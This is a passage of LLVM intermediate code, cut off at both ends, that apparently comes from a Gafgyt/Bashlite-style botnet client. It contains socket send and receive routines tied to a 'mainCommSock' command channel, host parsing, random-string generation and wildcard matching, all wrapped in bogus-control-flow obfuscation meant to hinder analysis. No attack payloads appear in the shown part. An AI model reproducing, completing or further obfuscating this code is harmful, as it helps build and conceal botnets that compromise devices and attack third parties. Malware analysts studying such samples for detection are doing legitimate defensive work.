  %56 = trunc i32 %55 to i8
  %57 = load i8**, i8*** %11, align 8
  %58 = load i8*, i8** %57, align 8
  store i8 %56, i8* %58, align 1
  %59 = load i8**, i8*** %11, align 8
  %60 = load i8*, i8** %59, align 8
  %61 = getelementptr inbounds i8, i8* %60, i32 1
  store i8* %61, i8** %59, align 8
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.39
  %4 = load i32, i32* @y.40
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #5
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i8*, i8** %14, align 8
  %32 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0), i8* %31)
  %33 = load i32, i32* %11, align 4
  %34 = load i8*, i8** %14, align 8
  %35 = load i8*, i8** %14, align 8
  %36 = call i64 @strlen(i8* %35) #9
  %37 = call i64 @send(i32 %33, i8* %34, i64 %36, i32 16384)
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %16, align 4
  %39 = load i8*, i8** %14, align 8
  call void @free(i8* %39) #5
  %40 = load i32, i32* %16, align 4
  %41 = load i32, i32* @x.39
  %42 = load i32, i32* @y.40
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %2
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i8*, align 8
  %53 = alloca [1 x %struct.__va_list_tag], align 16
  %54 = alloca i32, align 4
  store i32 %0, i32* %49, align 4
  store i8* %1, i8** %50, align 8
  %55 = call noalias i8* @malloc(i64 2048) #5
  store i8* %55, i8** %51, align 8
  %56 = load i8*, i8** %51, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 2048, i32 1, i1 false)
  %57 = load i8*, i8** %51, align 8
  store i8* %57, i8** %52, align 8
  %58 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %59 = bitcast %struct.__va_list_tag* %58 to i8*
  call void @llvm.va_start(i8* %59)
  %60 = load i8*, i8** %50, align 8
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %62 = call i32 @print(i8** %51, i8* %60, %struct.__va_list_tag* %61)
  %63 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %64 = bitcast %struct.__va_list_tag* %63 to i8*
  call void @llvm.va_end(i8* %64)
  %65 = load i8*, i8** %52, align 8
  %66 = load i8*, i8** %52, align 8
  %67 = call i64 @strlen(i8* %66) #9
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  store i8 10, i8* %68, align 1
  %69 = load i8*, i8** %52, align 8
  %70 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0), i8* %69)
  %71 = load i32, i32* %49, align 4
  %72 = load i8*, i8** %52, align 8
  %73 = load i8*, i8** %52, align 8
  %74 = call i64 @strlen(i8* %73) #9
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* %54, align 4
  %77 = load i8*, i8** %52, align 8
  call void @free(i8* %77) #5
  %78 = load i32, i32* %54, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %102 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %53
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %124

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.41
  %26 = load i32, i32* @y.42
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.41
  %40 = load i32, i32* @y.42
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = xor i1 %50, true
  %52 = zext i1 %51 to i32
  store i32 %52, i32* %3, align 4
  br label %124

; <label>:53:                                     ; preds = %2
  %54 = load i8*, i8** %5, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %82

; <label>:58:                                     ; preds = %53
  %59 = load i32, i32* @x.41
  %60 = load i32, i32* @y.42
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %58
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = load i8*, i8** %5, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = call i32 @wildString(i8* %68, i8* %70)
  %72 = icmp ne i32 %71, 0
  %73 = xor i1 %72, true
  %74 = load i32, i32* @x.41
  %75 = load i32, i32* @y.42
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart220, label %originalBB5alteredBB

originalBBpart220:                                ; preds = %originalBB5
  br label %82

; <label>:82:                                     ; preds = %originalBBpart220, %53
  %83 = phi i1 [ false, %53 ], [ %73, %originalBBpart220 ]
  %84 = load i32, i32* @x.41
  %85 = load i32, i32* @y.42
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %82
  %92 = xor i1 %83, true
  %93 = zext i1 %92 to i32
  store i32 %93, i32* %3, align 4
  %94 = load i32, i32* @x.41
  %95 = load i32, i32* @y.42
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart227, label %originalBB22alteredBB

originalBBpart227:                                ; preds = %originalBB22
  br label %124

; <label>:102:                                    ; preds = %2
  %103 = load i8*, i8** %4, align 8
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = call i32 @toupper(i32 %105) #9
  %107 = load i8*, i8** %5, align 8
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = call i32 @toupper(i32 %109) #9
  %111 = icmp eq i32 %106, %110
  br i1 %111, label %112, label %120

; <label>:112:                                    ; preds = %102
  %113 = load i8*, i8** %4, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 1
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i32 @wildString(i8* %114, i8* %116)
  %118 = icmp ne i32 %117, 0
  %119 = xor i1 %118, true
  br label %120

; <label>:120:                                    ; preds = %112, %102
  %121 = phi i1 [ false, %102 ], [ %119, %112 ]
  %122 = xor i1 %121, true
  %123 = zext i1 %122 to i32
  store i32 %123, i32* %3, align 4
  br label %124

; <label>:124:                                    ; preds = %120, %originalBBpart227, %49, %9
  %125 = load i32, i32* %3, align 4
  ret i32 %125

originalBBalteredBB:                              ; preds = %originalBB, %24
  %126 = load i8*, i8** %4, align 8
  %127 = load i8*, i8** %5, align 8
  %128 = getelementptr inbounds i8, i8* %127, i64 1
  %129 = call i32 @wildString(i8* %126, i8* %128)
  %130 = icmp ne i32 %129, 0
  %_ = sub i1 %130, true
  %gen = mul i1 %_, true
  %_1 = sub i1 false, %130
  %gen2 = add i1 %_1, true
  %_3 = sub i1 false, %130
  %gen4 = add i1 %_3, true
  %131 = xor i1 %130, true
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %58
  %132 = load i8*, i8** %4, align 8
  %133 = getelementptr inbounds i8, i8* %132, i64 1
  %134 = load i8*, i8** %5, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = call i32 @wildString(i8* %133, i8* %135)
  %137 = icmp ne i32 %136, 0
  %_6 = shl i1 %137, true
  %_7 = shl i1 %137, true
  %_8 = sub i1 %137, true
  %gen9 = mul i1 %_8, true
  %_10 = sub i1 %137, true
  %gen11 = mul i1 %_10, true
  %_12 = sub i1 %137, true
  %gen13 = mul i1 %_12, true
  %_14 = shl i1 %137, true
  %_15 = shl i1 %137, true
  %_16 = sub i1 %137, true
  %gen17 = mul i1 %_16, true
  %_18 = shl i1 %137, true
  %138 = xor i1 %137, true
  br label %originalBB5

originalBB22alteredBB:                            ; preds = %originalBB22, %82
  %_23 = shl i1 %83, true
  %_24 = sub i1 false, %83
  %gen25 = add i1 %_24, true
  %139 = xor i1 %83, true
  %140 = zext i1 %139 to i32
  store i32 %140, i32* %3, align 4
  br label %originalBB22
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  %23 = load i32, i32* @x.45
  %24 = load i32, i32* @y.46
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i32, i32* @x.45
  %32 = load i32, i32* @y.46
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %22
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.47
  %5 = load i32, i32* @y.48
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %27 = load i8*, i8** %14, align 8
  %28 = load i32, i32* %15, align 4
  %29 = sext i32 %28 to i64
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 %29, i32 1, i1 false)
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %30, align 8
  %31 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = load i32, i32* @x.47
  %33 = load i32, i32* @y.48
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.47
  %42 = load i32, i32* @y.48
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %49, i64 0, i64 0
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %50) #5, !srcloc !2
  %52 = extractvalue { i64, i64* } %51, 0
  %53 = extractvalue { i64, i64* } %51, 1
  %54 = trunc i64 %52 to i32
  store i32 %54, i32* %18, align 4
  %55 = ptrtoint i64* %53 to i64
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %19, align 4
  %57 = load i32, i32* @x.47
  %58 = load i32, i32* @y.48
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %65

; <label>:65:                                     ; preds = %originalBBpart24
  %66 = load i32, i32* %13, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %71 = load i32, i32* %13, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %13, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %79, i32* %20, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %182

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* @x.47
  %83 = load i32, i32* @y.48
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %81
  %90 = load i32, i32* @x.47
  %91 = load i32, i32* @y.48
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %145, %originalBBpart28
  %99 = load i32, i32* %21, align 4
  %100 = icmp slt i32 %99, 10
  br i1 %100, label %101, label %165

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %102, align 8
  %103 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %103, align 8
  br label %104

; <label>:104:                                    ; preds = %101
  %105 = load i32, i32* @x.47
  %106 = load i32, i32* @y.48
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %114 = getelementptr inbounds [16 x i64], [16 x i64]* %113, i64 0, i64 0
  %115 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %114) #5, !srcloc !3
  %116 = extractvalue { i64, i64* } %115, 0
  %117 = extractvalue { i64, i64* } %115, 1
  %118 = trunc i64 %116 to i32
  store i32 %118, i32* %22, align 4
  %119 = ptrtoint i64* %117 to i64
  %120 = trunc i64 %119 to i32
  store i32 %120, i32* %23, align 4
  %121 = load i32, i32* @x.47
  %122 = load i32, i32* @y.48
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %129

; <label>:129:                                    ; preds = %originalBBpart212
  %130 = load i32, i32* %13, align 4
  %131 = srem i32 %130, 64
  %132 = zext i32 %131 to i64
  %133 = shl i64 1, %132
  %134 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %16, i32 0, i32 0
  %135 = load i32, i32* %13, align 4
  %136 = sdiv i32 %135, 64
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [16 x i64], [16 x i64]* %134, i64 0, i64 %137
  %139 = load i64, i64* %138, align 8
  %140 = or i64 %139, %133
  store i64 %140, i64* %138, align 8
  %141 = load i32, i32* %13, align 4
  %142 = add nsw i32 %141, 1
  %143 = call i32 @select(i32 %142, %struct.fd_set* %16, %struct.fd_set* null, %struct.fd_set* %16, %struct.timeval* %17)
  store i32 %143, i32* %20, align 4
  %144 = icmp sle i32 %143, 0
  br i1 %144, label %145, label %148

; <label>:145:                                    ; preds = %129
  %146 = load i32, i32* %21, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %21, align 4
  br label %98

; <label>:148:                                    ; preds = %129
  %149 = load i32, i32* @x.47
  %150 = load i32, i32* @y.48
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %148
  %157 = load i32, i32* @x.47
  %158 = load i32, i32* @y.48
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %165

; <label>:165:                                    ; preds = %originalBBpart216, %98
  %166 = load i32, i32* @x.47
  %167 = load i32, i32* @y.48
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %165
  %174 = load i32, i32* @x.47
  %175 = load i32, i32* @y.48
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %182

; <label>:182:                                    ; preds = %originalBBpart220, %65
  store i32 0, i32* %26, align 4
  %183 = load i8*, i8** %14, align 8
  store i8* %183, i8** %25, align 8
  br label %184

; <label>:184:                                    ; preds = %originalBBpart232, %182
  %185 = load i32, i32* %15, align 4
  %186 = add nsw i32 %185, -1
  store i32 %186, i32* %15, align 4
  %187 = icmp sgt i32 %185, 1
  br i1 %187, label %188, label %253

; <label>:188:                                    ; preds = %184
  %189 = load i32, i32* @x.47
  %190 = load i32, i32* @y.48
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %188
  %197 = load i32, i32* @mainCommSock, align 4
  %198 = call i64 @recv(i32 %197, i8* %24, i64 1, i32 0)
  %199 = icmp ne i64 %198, 1
  %200 = load i32, i32* @x.47
  %201 = load i32, i32* @y.48
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %199, label %208, label %210

; <label>:208:                                    ; preds = %originalBBpart224
  %209 = load i8*, i8** %25, align 8
  store i8 0, i8* %209, align 1
  store i32 -1, i32* %12, align 4
  br label %256

; <label>:210:                                    ; preds = %originalBBpart224
  %211 = load i32, i32* @x.47
  %212 = load i32, i32* @y.48
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %210
  %219 = load i8, i8* %24, align 1
  %220 = load i8*, i8** %25, align 8
  %221 = getelementptr inbounds i8, i8* %220, i32 1
  store i8* %221, i8** %25, align 8
  store i8 %219, i8* %220, align 1
  %222 = load i8, i8* %24, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 10
  %225 = load i32, i32* @x.47
  %226 = load i32, i32* @y.48
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %224, label %233, label %234

; <label>:233:                                    ; preds = %originalBBpart228
  br label %253

; <label>:234:                                    ; preds = %originalBBpart228
  %235 = load i32, i32* @x.47
  %236 = load i32, i32* @y.48
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %234
